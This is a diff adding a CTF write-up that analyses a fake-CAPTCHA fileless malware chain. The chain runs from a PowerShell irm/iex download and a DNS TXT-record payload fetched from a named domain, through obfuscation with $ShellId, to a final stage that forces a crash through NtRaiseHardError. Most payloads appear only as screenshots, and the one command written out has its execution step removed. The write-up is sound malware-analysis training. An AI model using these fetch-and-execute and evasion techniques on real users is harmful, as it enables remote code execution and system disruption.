@@ -795,3 +795,134 @@ Flag:
 ```bash
 flag{ab63a76362c3972ac83d5cb8830fdb51}
 ```
+
+# Challenge 9: Clarification Verification (Fileless Malware)
+
+Author: @resume
+
+One of our users received an email asking them to provide extra verification to download a zip file, but they weren't expecting to receive any files.
+
+Can you look into the verification link to see if it's...phishy?
+
+NOTE, if you visit this link below and it does not respond, try to make a connection in a different way. The challenge is functional and you should get a response.
+
+Captcha.zip
+
+WARNING: Please examine this challenge inside of a virtual machine for your own security. Upon invocation there is a real possibility that your VM may crash. 
+
+---
+
+
+Clicking the link brings us to that page:
+
+![image](https://github.com/user-attachments/assets/ba457be9-2560-4946-9c1a-5214ca72649d)
+
+The captcha wants us to run the malware essentially, which is fileless:
+
+![image](https://github.com/user-attachments/assets/7f405995-ba1a-47bc-b237-c511419cc328)
+
+If you follow the FIRST instruction you will have the payload in our clipboard:
+
+![image](https://github.com/user-attachments/assets/6fced76d-9a26-487f-a86b-46d78ad0a59a)
+
+The functionality that confirms that statement is here in the source code of the website:
+
+![image](https://github.com/user-attachments/assets/44eda3a9-0a43-447c-9989-269433876037)
+
+This PowerShell command is designed to execute a potentially malicious payload by bypassing execution policies and fetching external content. It uses `Invoke-RestMethod (irm)` to download a script from `captcha.zip/verify`, which is then executed via `Invoke-Expression (iex)`. The `-NoProfile` and `-ExecutionPolicy Bypass` flags ensure that the command runs without system restrictions, making it a common technique in Capture The Flag (CTF) challenges for privilege escalation or malware delivery. The inclusion of a fake **reCAPTCHA verification message** suggests an attempt to obfuscate intent, potentially tricking users or automated defenses into perceiving the script as legitimate. This setup mimics real-world malware tactics used in phishing campaigns and automated exploitation frameworks.
+
+Another interesting point, the domain name of the website it is fetching from is a `.zip` domain. That is not a zip file, it is a website.
+
+We can open PowerShell in our windows  VM:
+
+![image](https://github.com/user-attachments/assets/38a46bbd-1921-4b3d-83a7-558165dc1187)
+
+We will run the command to output this way in order to see the response, removing the 'IEX' at the end so no expression is invoked (payload launched).
+
+Running it will look like this (spot correction):
+
+![image](https://github.com/user-attachments/assets/f667bb1c-c4aa-4e74-817f-e7f7aaeba382)
+
+One of my peers mentioned to me there may be an OS detection parameter in place, which happened to be true. The malware detects the OS in order to decide if it returns benign or malware data.
+
+On my host (where we have the IEX removed) I ran the command to see the following:
+
+![image](https://github.com/user-attachments/assets/6806c09b-fba7-4ac3-ac19-3616812f414e)
+
+This PowerShell script is designed to execute an obfuscated command by decoding a Base64 string and running it with elevated privileges. The encoded data is first decoded into a readable UTF-8 string, which likely contains another PowerShell command. The script then invokes the `Shell.Application` COM object to execute the decoded command with administrative rights, bypassing execution policy restrictions. This technique is used in fileless malware to evade detection while delivering a payload or performing system modifications.
+
+There is an encoded string in base64 text, which we can decode:
+
+![image](https://github.com/user-attachments/assets/0d1763c0-a914-48e4-843c-434aadb88dee)
+
+This PowerShell command retrieves a malicious payload by resolving the TXT record of `5gmlw.pyrchdata.com`, extracting the encoded content, and decoding it using Base64. The decoded data is then converted into a readable UTF-8 string and executed via `Invoke-Expression (iex)`, allowing remote code execution without directly downloading a file. This technique is used in fileless malware leveraging DNS queries to evade traditional security defenses and avoid detection by antivirus software.
+
+![image](https://github.com/user-attachments/assets/955b9aca-3e34-4a82-9117-d5a6f9fb1066)
+
+So this is where we can see the output of the TXT record containing a base64 encoded payload to be decoded in the malware, in a next step.
+
+We can use PowerShell in our Windows host safely by removing the IEX piece to run and output the results to a text file:
+```powershell
+echo ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Resolve-DnsName -Name 5gmlw.pyrchdata.com -Type TXT).Strings -join ''))) > payload.txt
+```
+
+This gives us the payload:
+
+![image](https://github.com/user-attachments/assets/65b71411-2dd8-430f-a0ab-31cd263cdc33)
+
+This PowerShell script is a **fileless malware loader** that decodes and decompresses a hidden payload stored as a Base64-encoded, Deflate-compressed string. It reconstructs the original PowerShell code in memory, then executes it dynamically using `Invoke-Expression` (`iex`), without writing anything to disk. This technique is commonly used to evade antivirus and detection tools, as the actual malicious logic remains obfuscated and is only revealed at runtime. The purpose of the script is likely to download or execute a second-stage payload, establish persistence, or connect to a command-and-control (C2) server.
+
+![image](https://github.com/user-attachments/assets/1a40377d-c9da-441b-a125-a3ce9469f9fa)
+
+By default, when calling `$ShellId` in PowerShell, it returns `Microsoft.PowerShell`, identifying the running shell environment. However, an obfuscation technique involves manipulating `$ShellId` by concatenating an additional `"X"` at the end—resulting in `Microsoft.PowerShellX`. This subtle transformation disguises the execution of `IEX` (Invoke-Expression) by indirectly constructing the command. Instead of explicitly calling `IEX`, attackers or CTF challenges use `$ShellId+'X'` to execute obfuscated scripts while bypassing simple string-based detection mechanisms. This technique leverages PowerShell's flexibility in string operations to evade traditional security measures.
+
+So in order to run this command we need to remove the invoke expression:
+
+![image](https://github.com/user-attachments/assets/0219d814-0839-4532-9e80-236b1cd23996)
+
+So we run this on my host RECKLESSLY:
+
+![image](https://github.com/user-attachments/assets/97aaed75-39a3-4194-bc72-ee402c3c98b6)
+
+The result is:
+
+![image](https://github.com/user-attachments/assets/8563ec50-62cc-4d96-a0c0-ac6eb8a08f89)
+
+The provided PowerShell snippet is a highly obfuscated script crafted to conceal its true intent. It utilizes a combination of string reversal, Base64 encoding, and dynamic execution via `Invoke-Expression` (`IEX`) to reconstruct and execute a hidden payload at runtime. This technique is often employed to evade static detection by security tools and analysts. The script appears to construct executable code from an encoded and reversed string, likely representing additional malicious logic or a secondary payload.
+
+However, the snippet seems either incomplete or intentionally malformed—attempts to decode the embedded string result in invalid or unreadable output. This may indicate missing data or the presence of additional encoding layers meant to frustrate reverse engineering efforts.
+
+To neutralize the script’s runtime behavior for safe analysis, the most effective approach is to remove or comment out the final `Invoke-Expression` call. This step disables execution while preserving the script’s structure, allowing analysts to dissect its logic without triggering any potentially harmful actions.
+
+Running the malware into a output file:
+
+![image](https://github.com/user-attachments/assets/5dfeaad7-5cf2-4eaf-ac8f-a47ed1e11d18)
+
+Same pattern in our payload 3 output:
+
+![image](https://github.com/user-attachments/assets/66a4afc3-1887-4d3c-912b-2849c83439be)
+
+This PowerShell script demonstrates a highly sophisticated level of obfuscation and functionality designed to evade detection and enable low-level system manipulation. It dynamically constructs C# code within the PowerShell runtime, compiling it in-memory using `Add-Type` and `System.CodeDom.Compiler.CompilerParameters`. The generated C# code imports critical native Windows API functions—`RtlAdjustPrivilege` and `NtRaiseHardError`—which are commonly abused by malware to adjust privileges and potentially crash or reboot the system, depending on the execution context and parameters.
+
+The script utilizes complex string concatenation and replacements to obfuscate both the class and method names as well as encoded payloads. Toward the end, it decodes and executes a Base64-encoded command using `Invoke-Expression` (`IeX`). This encoded segment appears to call `.NET` environment methods to manipulate environmental variables, possibly as part of a persistence or anti-analysis strategy.
+
+Overall, the script's intention seems to be to elevate privileges and disrupt system operation while hiding its true behavior through aggressive string manipulation and runtime code generation. Removing or commenting out the `IeX` execution line and intercepting the compilation and execution of the C# code would be critical for safely analyzing this script in a sandbox or controlled environment.
+
+![image](https://github.com/user-attachments/assets/a3ccd6f7-ff07-4f69-89bc-87462ce88c8b)
+
+Running the command:
+
+![image](https://github.com/user-attachments/assets/578ae9a4-ec52-4ede-9b3c-44465c5898ac)
+
+The result:
+
+![image](https://github.com/user-attachments/assets/afb7fab3-1b04-4207-b8c6-5dc96a2d0c0c)
+
+This PowerShell script dynamically compiles and runs C# code that calls two low-level Windows API functions from `ntdll.dll`: `RtlAdjustPrivilege` and `NtRaiseHardError`. The script first enables a special privilege (`SeShutdownPrivilege`) by calling `RtlAdjustPrivilege`, then triggers a critical system error with `NtRaiseHardError`, which can cause a Blue Screen of Death (BSOD) or system crash. After executing this, the script sets an environment variable named `flag` with a specific value in the current process. This technique is often used in malware or exploit code to escalate privileges and force a system failure.
+
+Decoding the most stand-out base64 text gives us the flag:
+
+![image](https://github.com/user-attachments/assets/68b8102f-a132-4db2-ad2a-d6c5c9c953ab)
+
+I did this statically, but you also could have done this dynamically where you could run it and crash. Then you would be able to notice where the flag was embedded in your environment variables, via Process Monitor.
+
